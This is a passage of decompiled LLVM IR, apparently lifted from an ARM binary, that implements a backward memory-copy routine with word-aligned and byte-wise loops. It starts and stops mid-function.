dec_label_pc_180b4:                               ; preds = %dec_label_pc_180b4.loopexit, %dec_label_pc_18090
  %v2_17f1c114 = phi i32 [ %v4_180a8, %dec_label_pc_180b4.loopexit ], [ %v12_18084, %dec_label_pc_18090 ]
  %v0_17f0c110 = phi i32 [ %v2_180ac, %dec_label_pc_180b4.loopexit ], [ %v2_18094, %dec_label_pc_18090 ]
  %v0_180b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_180b4 = add i32 %v0_180b4, -1
  store i32 %v1_180b4, i32* @r1, align 4
  br label %bb133

dec_label_pc_180bc:                               ; preds = %entry
  %v1_180bc = load i32, i32* @r2, align 4
  %v2_180bc = add i32 %v1_180bc, %v0_17e70
  store i32 %v2_180bc, i32* @r1, align 4
  %v2_180c0 = add i32 %v1_180bc, %v1_17e70
  store i32 %v2_180c0, i32* %r0.global-to-local, align 4
  %v2_180c4 = add i32 %v1_180bc, -4
  store i32 %v2_180c4, i32* %r2.global-to-local, align 4
  %v4_180c4 = sub i32 3, %v1_180bc
  %v5_180c4 = and i32 %v4_180c4, %v1_180bc
  %v6_180c4 = icmp slt i32 %v5_180c4, 0
  store i1 %v6_180c4, i1* %cpsr_v.global-to-local, align 1
  %v7_180c4 = icmp slt i32 %v2_180c4, 0
  store i1 %v7_180c4, i1* %cpsr_n.global-to-local, align 1
  %v5_180c8 = icmp slt i32 %v1_180bc, 4
  br i1 %v5_180c8, label %bb143, label %dec_label_pc_180cc

dec_label_pc_180cc:                               ; preds = %dec_label_pc_180bc
  %v1_180cc = urem i32 %v2_180c0, 4
  store i32 %v1_180cc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_180cc = icmp eq i32 %v1_180cc, 0
  br i1 %v2_180cc, label %dec_label_pc_180d4, label %dec_label_pc_18174

dec_label_pc_180d4:                               ; preds = %dec_label_pc_180cc
  %v1_180d4 = urem i32 %v2_180bc, 4
  store i32 %v1_180d4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_180d4 = icmp eq i32 %v1_180d4, 0
  br i1 %v2_180d4, label %dec_label_pc_180dc, label %dec_label_pc_181a0

dec_label_pc_180dc:                               ; preds = %dec_label_pc_180d4, %dec_label_pc_18198
  %v0_180f449 = phi i32 [ %v2_180c0, %dec_label_pc_180d4 ], [ %v0_181e832, %dec_label_pc_18198 ]
  %v0_180f048 = phi i32 [ %v2_180bc, %dec_label_pc_180d4 ], [ %v0_18198, %dec_label_pc_18198 ]
  %v0_180dc = phi i32 [ %v2_180c4, %dec_label_pc_180d4 ], [ %v2_18190, %dec_label_pc_18198 ]
  %v2_180dc = add i32 %v0_180dc, -8
  store i32 %v2_180dc, i32* %r2.global-to-local, align 4
  %v4_180dc = sub i32 7, %v0_180dc
  %v5_180dc = and i32 %v4_180dc, %v0_180dc
  %v6_180dc = icmp slt i32 %v5_180dc, 0
  store i1 %v6_180dc, i1* %cpsr_v.global-to-local, align 1
  %v7_180dc = icmp slt i32 %v2_180dc, 0
  store i1 %v7_180dc, i1* %cpsr_n.global-to-local, align 1
  %v5_180e0 = icmp slt i32 %v0_180dc, 8
  br i1 %v5_180e0, label %dec_label_pc_1812c, label %dec_label_pc_180e4

dec_label_pc_180e4:                               ; preds = %dec_label_pc_180dc
  %v3_180e4 = load i32, i32* @r4, align 4
  %v5_180e4 = inttoptr i32 %v3_180e4 to i8*
  store i8* %v5_180e4, i8** %stack_var_-8, align 4
  %v8_180e4 = load i32, i32* @lr, align 4
  %v2_180e8 = add i32 %v0_180dc, -28
  store i32 %v2_180e8, i32* %r2.global-to-local, align 4
  %v4_180e8 = sub i32 27, %v0_180dc
  %v5_180e8 = and i32 %v4_180e8, %v2_180dc
  %v6_180e8 = icmp slt i32 %v5_180e8, 0
  store i1 %v6_180e8, i1* %cpsr_v.global-to-local, align 1
  %v7_180e8 = icmp slt i32 %v2_180e8, 0
  store i1 %v7_180e8, i1* %cpsr_n.global-to-local, align 1
  %v5_180ec = icmp slt i32 %v2_180dc, 20
  br i1 %v5_180ec, label %dec_label_pc_18108, label %dec_label_pc_180f0

dec_label_pc_180f0:                               ; preds = %dec_label_pc_180e4, %dec_label_pc_180f0.dec_label_pc_180f0_crit_edge
  %v0_180f4 = phi i32 [ %v1_180fc, %dec_label_pc_180f0.dec_label_pc_180f0_crit_edge ], [ %v0_180f449, %dec_label_pc_180e4 ]
  %v0_180f0 = phi i32 [ %v0_180f0.pre, %dec_label_pc_180f0.dec_label_pc_180f0_crit_edge ], [ %v0_180f048, %dec_label_pc_180e4 ]
  %v1_180f0 = add i32 %v0_180f0, -4
  %v2_180f0 = inttoptr i32 %v1_180f0 to i32*
  %v3_180f0 = load i32, i32* %v2_180f0, align 4
  store i32 %v3_180f0, i32* %r3.global-to-local, align 4
  %v4_180f0 = add i32 %v0_180f0, -8
  %v5_180f0 = inttoptr i32 %v4_180f0 to i32*
  %v6_180f0 = load i32, i32* %v5_180f0, align 4
  store i32 %v6_180f0, i32* %r4.global-to-local, align 4
  %v7_180f0 = add i32 %v0_180f0, -12
  %v8_180f0 = inttoptr i32 %v7_180f0 to i32*
  %v9_180f0 = load i32, i32* %v8_180f0, align 4
  store i32 %v9_180f0, i32* %ip.global-to-local, align 4
  %v10_180f0 = add i32 %v0_180f0, -16
  %v11_180f0 = inttoptr i32 %v10_180f0 to i32*
  %v12_180f0 = load i32, i32* %v11_180f0, align 4
  store i32 %v12_180f0, i32* %lr.global-to-local, align 4
  store i32 %v10_180f0, i32* %r1.global-to-local, align 4
  %v1_180f4 = add i32 %v0_180f4, -16
  %v2_180f4 = inttoptr i32 %v1_180f4 to i32*
  store i32 %v3_180f0, i32* %v2_180f4, align 4
  %v4_180f4 = add i32 %v0_180f4, -12
  %v5_180f4 = inttoptr i32 %v4_180f4 to i32*
  %v6_180f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_180f4, i32* %v5_180f4, align 4
  %v7_180f4 = add i32 %v0_180f4, -8
  %v8_180f4 = inttoptr i32 %v7_180f4 to i32*
  %v9_180f4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_180f4, i32* %v8_180f4, align 4
  %v10_180f4 = add i32 %v0_180f4, -4
  %v11_180f4 = inttoptr i32 %v10_180f4 to i32*
  %v12_180f4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_180f4, i32* %v11_180f4, align 4
  store i32 %v1_180f4, i32* %r0.global-to-local, align 4
  %v0_180f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_180f8 = add i32 %v0_180f8, -4
  %v2_180f8 = inttoptr i32 %v1_180f8 to i32*
  %v3_180f8 = load i32, i32* %v2_180f8, align 4
  store i32 %v3_180f8, i32* %r3.global-to-local, align 4
  %v4_180f8 = add i32 %v0_180f8, -8
  %v5_180f8 = inttoptr i32 %v4_180f8 to i32*
  %v6_180f8 = load i32, i32* %v5_180f8, align 4
  store i32 %v6_180f8, i32* %r4.global-to-local, align 4
  %v7_180f8 = add i32 %v0_180f8, -12
  %v8_180f8 = inttoptr i32 %v7_180f8 to i32*
  %v9_180f8 = load i32, i32* %v8_180f8, align 4
  store i32 %v9_180f8, i32* @ip, align 4
  %v10_180f8 = add i32 %v0_180f8, -16
  %v11_180f8 = inttoptr i32 %v10_180f8 to i32*
  %v12_180f8 = load i32, i32* %v11_180f8, align 4
  store i32 %v12_180f8, i32* %lr.global-to-local, align 4
  store i32 %v10_180f8, i32* @r1, align 4
  %v1_180fc = add i32 %v0_180f4, -32
  %v2_180fc = inttoptr i32 %v1_180fc to i32*
  store i32 %v3_180f8, i32* %v2_180fc, align 4
  %v4_180fc = add i32 %v0_180f4, -28
  %v5_180fc = inttoptr i32 %v4_180fc to i32*
  %v6_180fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_180fc, i32* %v5_180fc, align 4
  %v7_180fc = add i32 %v0_180f4, -24
  %v8_180fc = inttoptr i32 %v7_180fc to i32*
  %v9_180fc = load i32, i32* @ip, align 4
  store i32 %v9_180fc, i32* %v8_180fc, align 4
  %v10_180fc = add i32 %v0_180f4, -20
  %v11_180fc = inttoptr i32 %v10_180fc to i32*
  %v12_180fc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_180fc, i32* %v11_180fc, align 4
  store i32 %v1_180fc, i32* %r0.global-to-local, align 4
  %v0_18100 = load i32, i32* %r2.global-to-local, align 4
  %v2_18100 = add i32 %v0_18100, -32
  store i32 %v2_18100, i32* %r2.global-to-local, align 4
  %v6_18104 = icmp slt i32 %v0_18100, 32
  br i1 %v6_18104, label %dec_label_pc_18108.loopexit, label %dec_label_pc_180f0.dec_label_pc_180f0_crit_edge

dec_label_pc_180f0.dec_label_pc_180f0_crit_edge:  ; preds = %dec_label_pc_180f0
  %v0_180f0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_180f0

dec_label_pc_18108.loopexit:                      ; preds = %dec_label_pc_180f0
  %v4_18100 = sub i32 31, %v0_18100
  %v5_18100 = and i32 %v4_18100, %v0_18100
  %v6_18100 = icmp slt i32 %v5_18100, 0
  %v7_18100 = icmp slt i32 %v2_18100, 0
  store i1 %v6_18100, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18100, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18108

dec_label_pc_18108:                               ; preds = %dec_label_pc_18108.loopexit, %dec_label_pc_180e4
  %v6_18110 = phi i32 [ %v1_180fc, %dec_label_pc_18108.loopexit ], [ %v0_180f449, %dec_label_pc_180e4 ]
  %v0_18118.pr = phi i32 [ %v2_18100, %dec_label_pc_18108.loopexit ], [ %v2_180e8, %dec_label_pc_180e4 ]
  %v4_18108 = add i32 %v0_18118.pr, 16
  %v6_18108 = sub i32 0, %v0_18118.pr
  %v7_18108 = and i32 %v4_18108, %v6_18108
  %v8_18108 = icmp slt i32 %v7_18108, 0
  store i1 %v8_18108, i1* %cpsr_v.global-to-local, align 1
  %v9_18108 = icmp slt i32 %v4_18108, 0
  store i1 %v9_18108, i1* %cpsr_n.global-to-local, align 1
  %v5_1810c = icmp slt i32 %v0_18118.pr, -16
  br i1 %v5_1810c, label %.thread14, label %bb140

bb140:                                            ; preds = %dec_label_pc_18108
  %v6_1810c = load i32, i32* @r1, align 4
  %v7_1810c = add i32 %v6_1810c, -4
  %v8_1810c = inttoptr i32 %v7_1810c to i32*
  %v9_1810c = load i32, i32* %v8_1810c, align 4
  store i32 %v9_1810c, i32* %r3.global-to-local, align 4
  %v10_1810c = add i32 %v6_1810c, -8
  %v11_1810c = inttoptr i32 %v10_1810c to i32*
  %v12_1810c = load i32, i32* %v11_1810c, align 4
  store i32 %v12_1810c, i32* %r4.global-to-local, align 4
  %v13_1810c = add i32 %v6_1810c, -12
  %v14_1810c = inttoptr i32 %v13_1810c to i32*
  %v15_1810c = load i32, i32* %v14_1810c, align 4
  store i32 %v15_1810c, i32* @ip, align 4
  %v16_1810c = add i32 %v6_1810c, -16
  %v17_1810c = inttoptr i32 %v16_1810c to i32*
  %v18_1810c = load i32, i32* %v17_1810c, align 4
  store i32 %v18_1810c, i32* %lr.global-to-local, align 4
  store i32 %v16_1810c, i32* @r1, align 4
  %v7_18110 = add i32 %v6_18110, -16
  %v8_18110 = inttoptr i32 %v7_18110 to i32*
  store i32 %v9_1810c, i32* %v8_18110, align 4
  %v10_18110 = add i32 %v6_18110, -12
  %v11_18110 = inttoptr i32 %v10_18110 to i32*
  %v12_18110 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_18110, i32* %v11_18110, align 4
  %v13_18110 = add i32 %v6_18110, -8
  %v14_18110 = inttoptr i32 %v13_18110 to i32*
  %v15_18110 = load i32, i32* @ip, align 4
  store i32 %v15_18110, i32* %v14_18110, align 4
  %v16_18110 = add i32 %v6_18110, -4
  %v17_18110 = inttoptr i32 %v16_18110 to i32*
  %v18_18110 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_18110, i32* %v17_18110, align 4
  store i32 %v7_18110, i32* %r0.global-to-local, align 4
  %v6_18114 = load i32, i32* %r2.global-to-local, align 4
  %v7_18114 = add i32 %v6_18114, -16
  store i32 %v7_18114, i32* %r2.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_18108, %bb140
  %v6_18120 = phi i32 [ %v7_18110, %bb140 ], [ %v6_18110, %dec_label_pc_18108 ]
  %v0_18118 = phi i32 [ %v7_18114, %bb140 ], [ %v0_18118.pr, %dec_label_pc_18108 ]
  %v4_18118 = add i32 %v0_18118, 20
  store i32 %v4_18118, i32* %r2.global-to-local, align 4
  %v6_18118 = sub i32 0, %v0_18118
  %v7_18118 = and i32 %v4_18118, %v6_18118
  %v8_18118 = icmp slt i32 %v7_18118, 0
  store i1 %v8_18118, i1* %cpsr_v.global-to-local, align 1
  %v9_18118 = icmp slt i32 %v4_18118, 0
  store i1 %v9_18118, i1* %cpsr_n.global-to-local, align 1
  %v5_1811c = icmp slt i32 %v0_18118, -20
  br i1 %v5_1811c, label %.thread16, label %bb141

bb141:                                            ; preds = %.thread14
  %v6_1811c = load i32, i32* @r1, align 4
  %v7_1811c = add i32 %v6_1811c, -4
  %v8_1811c = inttoptr i32 %v7_1811c to i32*
  %v9_1811c = load i32, i32* %v8_1811c, align 4
  store i32 %v9_1811c, i32* %r3.global-to-local, align 4
  %v10_1811c = add i32 %v6_1811c, -8
  %v11_1811c = inttoptr i32 %v10_1811c to i32*
  %v12_1811c = load i32, i32* %v11_1811c, align 4
  store i32 %v12_1811c, i32* @ip, align 4
  %v13_1811c = add i32 %v6_1811c, -12
  %v14_1811c = inttoptr i32 %v13_1811c to i32*
  %v15_1811c = load i32, i32* %v14_1811c, align 4
  store i32 %v15_1811c, i32* %lr.global-to-local, align 4
  store i32 %v13_1811c, i32* @r1, align 4
  %v7_18120 = add i32 %v6_18120, -12
  %v8_18120 = inttoptr i32 %v7_18120 to i32*
  store i32 %v9_1811c, i32* %v8_18120, align 4
  %v10_18120 = add i32 %v6_18120, -8
  %v11_18120 = inttoptr i32 %v10_18120 to i32*
  %v12_18120 = load i32, i32* @ip, align 4
  store i32 %v12_18120, i32* %v11_18120, align 4
  %v13_18120 = add i32 %v6_18120, -4
  %v14_18120 = inttoptr i32 %v13_18120 to i32*
  %v15_18120 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_18120, i32* %v14_18120, align 4
  store i32 %v7_18120, i32* %r0.global-to-local, align 4
  %v6_18124 = load i32, i32* %r2.global-to-local, align 4
  %v7_18124 = add i32 %v6_18124, -12
  store i32 %v7_18124, i32* %r2.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %.thread14, %bb141
  %v6_1814457 = phi i32 [ %v6_18120, %.thread14 ], [ %v7_18120, %bb141 ]
  %v0_1812c55 = phi i32 [ %v4_18118, %.thread14 ], [ %v7_18124, %bb141 ]
  %v2_18128 = load i8*, i8** %stack_var_-8, align 4
  %v3_18128 = ptrtoint i8* %v2_18128 to i32
  store i32 %v3_18128, i32* @r4, align 4
  store i32 %v8_180e4, i32* @lr, align 4
  br label %dec_label_pc_1812c

dec_label_pc_1812c:                               ; preds = %dec_label_pc_180dc, %.thread16
  %v7_1813c = phi i32 [ %v0_180f449, %dec_label_pc_180dc ], [ %v6_1814457, %.thread16 ]
  %v0_1812c = phi i32 [ %v2_180dc, %dec_label_pc_180dc ], [ %v0_1812c55, %.thread16 ]
  %v2_1812c = add i32 %v0_1812c, 8
  store i32 %v2_1812c, i32* %r2.global-to-local, align 4
  %v4_1812c = sub i32 0, %v0_1812c
  %v5_1812c = and i32 %v2_1812c, %v4_1812c
  %v6_1812c = icmp slt i32 %v5_1812c, 0
  store i1 %v6_1812c, i1* %cpsr_v.global-to-local, align 1
  %v7_1812c = icmp slt i32 %v2_1812c, 0
  store i1 %v7_1812c, i1* %cpsr_n.global-to-local, align 1
  %v5_18130 = icmp slt i32 %v0_1812c, -8
  br i1 %v5_18130, label %bb143, label %dec_label_pc_18134

dec_label_pc_18134:                               ; preds = %dec_label_pc_1812c
  %v6_18134 = add i32 %v0_1812c, 4
  store i32 %v6_18134, i32* %r2.global-to-local, align 4
  %v8_18134 = sub i32 -5, %v0_1812c
  %v9_18134 = and i32 %v8_18134, %v2_1812c
  %v10_18134 = icmp slt i32 %v9_18134, 0
  store i1 %v10_18134, i1* %cpsr_v.global-to-local, align 1
  %v11_18134 = icmp slt i32 %v6_18134, 0
  store i1 %v11_18134, i1* %cpsr_n.global-to-local, align 1
  %v5_18138 = icmp slt i32 %v2_1812c, 4
  %v6_18138 = load i32, i32* @r1, align 4
  %v7_18138 = add i32 %v6_18138, -4
  %v8_18138 = inttoptr i32 %v7_18138 to i32*
  %v9_18138 = load i32, i32* %v8_18138, align 4
  store i32 %v9_18138, i32* %r3.global-to-local, align 4
  br i1 %v5_18138, label %.thread20, label %bb142

.thread20:                                        ; preds = %dec_label_pc_18134
  store i32 %v7_18138, i32* @r1, align 4
  %v8_1813c = add i32 %v7_1813c, -4
  %v9_1813c = inttoptr i32 %v8_1813c to i32*
  store i32 %v9_18138, i32* %v9_1813c, align 4
  %v10_1813c = load i32, i32* %r0.global-to-local, align 4
  %v11_1813c = add i32 %v10_1813c, -4
  store i32 %v11_1813c, i32* %r0.global-to-local, align 4
  %v0_1814c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb143

bb142:                                            ; preds = %dec_label_pc_18134
  %v10_18140 = add i32 %v6_18138, -8
  %v11_18140 = inttoptr i32 %v10_18140 to i32*
  %v12_18140 = load i32, i32* %v11_18140, align 4
  store i32 %v12_18140, i32* @ip, align 4
  store i32 %v10_18140, i32* @r1, align 4
  %v7_18144 = add i32 %v7_1813c, -8
  %v8_18144 = inttoptr i32 %v7_18144 to i32*
  store i32 %v9_18138, i32* %v8_18144, align 4
  %v10_18144 = add i32 %v7_1813c, -4
  %v11_18144 = inttoptr i32 %v10_18144 to i32*
  %v12_18144 = load i32, i32* @ip, align 4
  store i32 %v12_18144, i32* %v11_18144, align 4
  store i32 %v7_18144, i32* %r0.global-to-local, align 4
  %v6_18148 = load i32, i32* %r2.global-to-local, align 4
  %v7_18148 = add i32 %v6_18148, -4
  store i32 %v7_18148, i32* %r2.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %.thread20, %.thread26, %dec_label_pc_1812c, %dec_label_pc_180bc, %dec_label_pc_182f0, %dec_label_pc_18284, %dec_label_pc_18218, %bb142
  %v2_18150 = phi i32 [ %v11_1813c, %.thread20 ], [ %v0_181e832, %.thread26 ], [ %v7_1813c, %dec_label_pc_1812c ], [ %v2_180c0, %dec_label_pc_180bc ], [ %v2_1815c65, %dec_label_pc_182f0 ], [ %v2_1815c64, %dec_label_pc_18284 ], [ %v2_1815c63, %dec_label_pc_18218 ], [ %v7_18144, %bb142 ]
  %v0_1814c = phi i32 [ %v0_1814c.pre, %.thread20 ], [ %v2_18190, %.thread26 ], [ %v2_1812c, %dec_label_pc_1812c ], [ %v2_180c4, %dec_label_pc_180bc ], [ %v0_1814c61, %dec_label_pc_182f0 ], [ %v0_1814c60, %dec_label_pc_18284 ], [ %v0_1814c59, %dec_label_pc_18218 ], [ %v7_18148, %bb142 ]
  %v1_1814c = add i32 %v0_1814c, 4
  store i32 %v1_1814c, i32* @r2, align 4
  %v3_1814c = sub i32 0, %v0_1814c
  %v4_1814c = and i32 %v1_1814c, %v3_1814c
  %v5_1814c = icmp slt i32 %v4_1814c, 0
  store i1 %v5_1814c, i1* %cpsr_v.global-to-local, align 1
  %v6_1814c = icmp slt i32 %v1_1814c, 0
  store i1 %v6_1814c, i1* %cpsr_n.global-to-local, align 1
  %v7_1814c = icmp eq i32 %v1_1814c, 0
  store i1 %v7_1814c, i1* @cpsr_z, align 1
  br i1 %v7_1814c, label %.thread123, label %bb144

bb144:                                            ; preds = %bb143
  %v1_18154 = add i32 %v0_1814c, 2
  %v3_18154 = sub i32 -3, %v0_1814c
  %v4_18154 = and i32 %v3_18154, %v1_1814c
  %v5_18154 = icmp slt i32 %v4_18154, 0
  store i1 %v5_18154, i1* %cpsr_v.global-to-local, align 1
  %v6_18154 = icmp slt i32 %v1_18154, 0
  store i1 %v6_18154, i1* %cpsr_n.global-to-local, align 1
  %v7_18154 = icmp eq i32 %v1_1814c, 2
  store i1 %v7_18154, i1* @cpsr_z, align 1
  %v0_18158 = load i32, i32* @r1, align 4
  %v1_18158 = add i32 %v0_18158, -1
  %v2_18158 = inttoptr i32 %v1_18158 to i8*
  %v3_18158 = load i8, i8* %v2_18158, align 1
  %v4_18158 = zext i8 %v3_18158 to i32
  store i32 %v4_18158, i32* %r3.global-to-local, align 4
  store i32 %v1_18158, i32* @r1, align 4
  %v3_1815c = add i32 %v2_18150, -1
  %v4_1815c = inttoptr i32 %v3_1815c to i8*
  store i8 %v3_18158, i8* %v4_1815c, align 1
  %v5_1815c = load i32, i32* %r0.global-to-local, align 4
  %v6_1815c = add i32 %v5_1815c, -1
  store i32 %v6_1815c, i32* %r0.global-to-local, align 4
  %v0_18160 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18160 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_18160 = xor i1 %v0_18160, %v1_18160
  br i1 %v2_18160, label %.thread122, label %bb145

bb145:                                            ; preds = %bb144
  %v3_18160 = load i32, i32* @r1, align 4
  %v4_18160 = add i32 %v3_18160, -1
  %v5_18160 = inttoptr i32 %v4_18160 to i8*
  %v6_18160 = load i8, i8* %v5_18160, align 1
  %v7_18160 = zext i8 %v6_18160 to i32
  store i32 %v7_18160, i32* %r3.global-to-local, align 4
  store i32 %v4_18160, i32* @r1, align 4
  %v6_18164 = add i32 %v5_1815c, -2
  %v7_18164 = inttoptr i32 %v6_18164 to i8*
  store i8 %v6_18160, i8* %v7_18164, align 1
  %v8_18164 = load i32, i32* %r0.global-to-local, align 4
  %v9_18164 = add i32 %v8_18164, -1
  store i32 %v9_18164, i32* %r0.global-to-local, align 4
  %v1_18168.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18168.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread122

.thread122:                                       ; preds = %bb144, %bb145
  %v7_1816c = phi i32 [ %v9_18164, %bb145 ], [ %v6_1815c, %bb144 ]
  %v2_1816c = phi i1 [ %v2_18168.pre, %bb145 ], [ %v1_18160, %bb144 ]
  %v1_1816c = phi i1 [ %v1_18168.pre, %bb145 ], [ %v0_18160, %bb144 ]
  %v0_18168 = load i1, i1* @cpsr_z, align 1
  %v3_18168 = xor i1 %v2_1816c, %v1_1816c
  %v4_18168 = or i1 %v0_18168, %v3_18168
  br i1 %v4_18168, label %.thread123, label %bb146

bb146:                                            ; preds = %.thread122
  %v5_18168 = load i32, i32* @r1, align 4
  %v6_18168 = add i32 %v5_18168, -1
  %v7_18168 = inttoptr i32 %v6_18168 to i8*
  %v8_18168 = load i8, i8* %v7_18168, align 1
  %v9_18168 = zext i8 %v8_18168 to i32
  store i32 %v9_18168, i32* %r3.global-to-local, align 4
  store i32 %v6_18168, i32* @r1, align 4
  %v8_1816c = add i32 %v7_1816c, -1
  %v9_1816c = inttoptr i32 %v8_1816c to i8*
  store i8 %v8_18168, i8* %v9_1816c, align 1
  %v10_1816c = load i32, i32* %r0.global-to-local, align 4
  %v11_1816c = add i32 %v10_1816c, -1
  store i32 %v11_1816c, i32* %r0.global-to-local, align 4
  br label %.thread123

dec_label_pc_18174:                               ; preds = %dec_label_pc_180cc
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_18174 = icmp eq i32 %v1_180cc, 1
  store i1 %v8_18174, i1* %cpsr_n.global-to-local, align 1
  %v1_18178 = add i32 %v2_180bc, -1
  %v2_18178 = inttoptr i32 %v1_18178 to i8*
  %v3_18178 = load i8, i8* %v2_18178, align 1
  %v4_18178 = zext i8 %v3_18178 to i32
  store i32 %v4_18178, i32* %r3.global-to-local, align 4
  store i32 %v1_18178, i32* @r1, align 4
  %v3_1817c = add i32 %v2_180c0, -1
  %v4_1817c = inttoptr i32 %v3_1817c to i8*
  store i8 %v3_18178, i8* %v4_1817c, align 1
  %v5_1817c = load i32, i32* %r0.global-to-local, align 4
  %v6_1817c = add i32 %v5_1817c, -1
  store i32 %v6_1817c, i32* %r0.global-to-local, align 4
  br i1 %v8_18174, label %.thread26, label %bb147

bb147:                                            ; preds = %dec_label_pc_18174
  %v9_18174 = icmp eq i32 %v1_180cc, 2
  %v6_18180 = load i32, i32* @r1, align 4
  %v7_18180 = add i32 %v6_18180, -1
  %v8_18180 = inttoptr i32 %v7_18180 to i8*
  %v9_18180 = load i8, i8* %v8_18180, align 1
  %v10_18180 = zext i8 %v9_18180 to i32
  store i32 %v10_18180, i32* %r3.global-to-local, align 4
  store i32 %v7_18180, i32* @r1, align 4
  %v9_18184 = add i32 %v5_1817c, -2
  %v10_18184 = inttoptr i32 %v9_18184 to i8*
  store i8 %v9_18180, i8* %v10_18184, align 1
  %v11_18184 = load i32, i32* %r0.global-to-local, align 4
  %v12_18184 = add i32 %v11_18184, -1
  store i32 %v12_18184, i32* %r0.global-to-local, align 4
  br i1 %v9_18174, label %.thread26, label %bb148

bb148:                                            ; preds = %bb147
  %v8_18188 = load i32, i32* @r1, align 4
  %v9_18188 = add i32 %v8_18188, -1
  %v10_18188 = inttoptr i32 %v9_18188 to i8*
  %v11_18188 = load i8, i8* %v10_18188, align 1
  %v12_18188 = zext i8 %v11_18188 to i32
  store i32 %v12_18188, i32* %r3.global-to-local, align 4
  store i32 %v9_18188, i32* @r1, align 4
  %v11_1818c = add i32 %v11_18184, -2
  %v12_1818c = inttoptr i32 %v11_1818c to i8*
  store i8 %v11_18188, i8* %v12_1818c, align 1
  %v13_1818c = load i32, i32* %r0.global-to-local, align 4
  %v14_1818c = add i32 %v13_1818c, -1
  store i32 %v14_1818c, i32* %r0.global-to-local, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb147, %dec_label_pc_18174, %bb148
  %v0_181e832 = phi i32 [ %v12_18184, %bb147 ], [ %v6_1817c, %dec_label_pc_18174 ], [ %v14_1818c, %bb148 ]
  %v0_18190 = load i32, i32* %r2.global-to-local, align 4
  %v1_18190 = load i32, i32* @ip, align 4
  %v2_18190 = sub i32 %v0_18190, %v1_18190
  store i32 %v2_18190, i32* %r2.global-to-local, align 4
  %v4_18190 = xor i32 %v1_18190, %v0_18190
  %v5_18190 = xor i32 %v2_18190, %v0_18190
  %v6_18190 = and i32 %v5_18190, %v4_18190
  %v7_18190 = icmp slt i32 %v6_18190, 0
  store i1 %v7_18190, i1* %cpsr_v.global-to-local, align 1
  %v8_18190 = icmp slt i32 %v2_18190, 0
  store i1 %v8_18190, i1* %cpsr_n.global-to-local, align 1
  %v5_18194 = icmp slt i32 %v0_18190, %v1_18190
  br i1 %v5_18194, label %bb143, label %dec_label_pc_18198

dec_label_pc_18198:                               ; preds = %.thread26
  %v0_18198 = load i32, i32* @r1, align 4
  %v1_18198 = urem i32 %v0_18198, 4
  store i32 %v1_18198, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18198 = icmp eq i32 %v1_18198, 0
  br i1 %v2_18198, label %dec_label_pc_180dc, label %dec_label_pc_181a0

dec_label_pc_181a0:                               ; preds = %dec_label_pc_180d4, %dec_label_pc_18198
  %v0_181e831 = phi i32 [ %v2_180c0, %dec_label_pc_180d4 ], [ %v0_181e832, %dec_label_pc_18198 ]
  %v0_18294 = phi i32 [ %v2_180c4, %dec_label_pc_180d4 ], [ %v2_18190, %dec_label_pc_18198 ]
  %v0_181a0 = phi i32 [ %v2_180bc, %dec_label_pc_180d4 ], [ %v0_18198, %dec_label_pc_18198 ]
  %v0_181a8 = phi i32 [ %v1_180d4, %dec_label_pc_180d4 ], [ %v1_18198, %dec_label_pc_18198 ]
  %v1_181a0 = and i32 %v0_181a0, -4
  store i32 %v1_181a0, i32* %r1.global-to-local, align 4
  %v1_181a4 = inttoptr i32 %v1_181a0 to i32*
  %v2_181a4 = load i32, i32* %v1_181a4, align 4
  store i32 %v2_181a4, i32* %r3.global-to-local, align 4
  %v7_181a8 = icmp ult i32 %v0_181a8, 2
  %v2_1828c = add i32 %v0_18294, -12
  %v4_1828c = sub i32 11, %v0_18294
  %v5_1828c = and i32 %v4_1828c, %v0_18294
  %v6_1828c = icmp slt i32 %v5_1828c, 0
  store i1 %v6_1828c, i1* %cpsr_v.global-to-local, align 1
  %v7_1828c = icmp slt i32 %v2_1828c, 0
  store i1 %v7_1828c, i1* %cpsr_n.global-to-local, align 1
  %v5_18290 = icmp slt i32 %v0_18294, 12
  br i1 %v7_181a8, label %dec_label_pc_1828c, label %dec_label_pc_181b0

dec_label_pc_181b0:                               ; preds = %dec_label_pc_181a0
  %v8_181a8 = icmp eq i32 %v0_181a8, 2
  br i1 %v8_181a8, label %dec_label_pc_18220, label %dec_label_pc_181b4

dec_label_pc_181b4:                               ; preds = %dec_label_pc_181b0
  br i1 %v5_18290, label %dec_label_pc_18200, label %dec_label_pc_181bc

dec_label_pc_181bc:                               ; preds = %dec_label_pc_181b4
  store i32 %v2_1828c, i32* %r2.global-to-local, align 4
  %v3_181c0 = load i32, i32* @r4, align 4
  store i32 %v3_181c0, i32* %stack_var_-12, align 4
  %v6_181c0 = load i32, i32* @r5, align 4
  %v8_181c0 = inttoptr i32 %v6_181c0 to i8*
  store i8* %v8_181c0, i8** %stack_var_-8, align 4
  %v11_181c0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_181c4

dec_label_pc_181c4:                               ; preds = %dec_label_pc_181c4.dec_label_pc_181c4_crit_edge, %dec_label_pc_181bc
